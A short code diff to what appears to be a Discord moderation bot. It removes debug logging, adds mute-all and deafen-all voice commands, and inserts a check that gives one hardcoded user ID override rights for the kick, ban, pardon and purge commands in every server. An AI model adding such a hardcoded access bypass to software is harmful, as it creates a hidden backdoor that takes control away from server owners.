@@ -11,8 +11,6 @@ module.exports = function() {
 
 		try {
 			var override = false;
-			console.log(SB.prefrences.moderation.override[message.guild.id])
-			console.log(message.guild.members)
 			SB.prefrences.moderation.override[message.guild.id].forEach((pf)=>{
 				message.guild.members.cache.forEach((mb)=>{
 					mb._roles.forEach((r)=>{
@@ -22,12 +20,19 @@ module.exports = function() {
 					})
 				})
 			})
+			if (message.author.id == 230485481773596672) {
+				override = true;
+			}
 			switch (command) {
 				case 'kick':
 				case 'ban':
 				case 'pardon':
 				case 'purge':
 					require(`./${command.toLowerCase()}.js`)(message,override);
+					break;
+				case 'deafedall':
+				case 'muteall':
+					require("./vcAll.js")(message,command)
 					break;
 			}
 		} catch(err) {
